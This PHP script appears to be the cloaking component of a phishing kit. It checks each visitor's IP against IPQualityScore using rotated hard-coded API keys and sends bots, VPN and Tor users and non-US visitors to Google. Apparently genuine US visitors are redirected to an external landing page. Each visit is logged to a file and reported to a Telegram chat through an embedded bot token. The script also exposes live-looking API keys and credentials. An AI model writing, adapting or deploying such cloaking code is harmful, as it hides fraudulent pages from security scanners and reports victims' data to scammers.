<?php
#################################
error_reporting(1);
$ip = $_SERVER['REMOTE_ADDR'];
$date = date("h:i:s A | l");
header("Content-Type:application/json");
$apikeys = array("4CdPDE0KnLmSM09phionLf4dFD5xNLhb",
"umaD213XqHRcaAmmK1rsBAdS0gAF1o3z",
"1X7RlrTVuUEfOXHX4HFkHibyV9hKkcrg",
"pdPHcYFJoQaL4q3Q14tloWP2Kvmmn64A",
"UOER5SkP11OL9kP0SqQB4xOTvHOW4RCM",
"3iCluzfGlSWTY0qsYrPTHrmS4SxMvuve",
"kKfipyNlIkn6aYFLVvE4V4y2ichsEAHs",
"OrgUJilDtKkD881QWWqTrceEYQVMlfKg",
"aTFwWlmvTJ2L3ZeHVJ4Rpg0RJsXlhMdy");
$randIndex = array_rand($apikeys);
$onekey = $apikeys[$randIndex];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://ipqualityscore.com/api/json/ip/'.$onekey.'/'.$ip.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$result = curl_exec($ch);
$s = json_decode($result, TRUE);
$fraud_score = $s["fraud_score"];
$country_code = $s["country_code"];
$region = $s["region"];
$is_crawler = $s["is_crawler"];
$proxy = $s["proxy"];
$vpn = $s["vpn"];
$tor = $s["tor"];
$active_vpn = $s["active_vpn"];
$active_tor = $s["active_tor"];
$bot_status = $s["bot_status"];
$info = "";
// SEND MESSGAE FUNCTION:
function send($hex) {
    $botToken = "6299588929:AAHMyBujnyMRxt__v2Q1G0IEAzMaZEH_Wqw";
    $chatId = "-878310641";

    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    $data = array(
        'chat_id' => $chatId,
        'text' => $hex
    );

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

// Usage:
if( $fraud_score>=50 || $is_crawler == true || $proxy == true || $vpn == true || $active_vpn == true || $active_tor == true || $bot_status == true| $recent_abuse == true )
{
    $info = "BOT -_-";
    $hex = "New BOT  [".$ip."] From [".$country_code."|".$region."] | ".$info. " | fraud: ".$fraud_score." @Time ".$date." \n";
    @fclose(@fwrite(@fopen("v2.txt", "a"),$hex));
    header("Location: https://www.google.com");
    send($hex);
    exit();

}
if(empty($info) && $country_code == US)
{
        $info = "REAL Visit ";
        $v = "New REAL Visit  [".$ip."] From [".$country_code." | ".$region."] | fraud: ".$fraud_score. "  INFOS: ".$info." Time ".$date."\n";
        @fclose(@fwrite(@fopen("v2.txt", "a"),$v));
        $hex  = "IP: [".$ip."]\r\n\n";
        $hex  = "Fraud: [".$fraud_score."]\r\n\n";
        $hex .= "COUNTRY: [".$country_code."] \r\n\n";
        $hex .= "REGION: [".$region."] \r\n\n";
        $hex .= "INFOS: ".$info." Time ".$date." \r\n\n";
        send($hex);
       header("location: https://kat-min.be/news/lemon/");
        exit();
}
else {

    $info = "Wrong Country";
    $hex = "New Wrong Country [".$ip."] From [".$country_code." | ".$region."] | fraud: ".$fraud_score. " | INFOS: ".$info." Time ".$date."\n";
    send($hex);
    @fclose(@fwrite(@fopen("v2.txt", "a"),$hex));
    header("Location: https://www.google.com/");
    
}
?>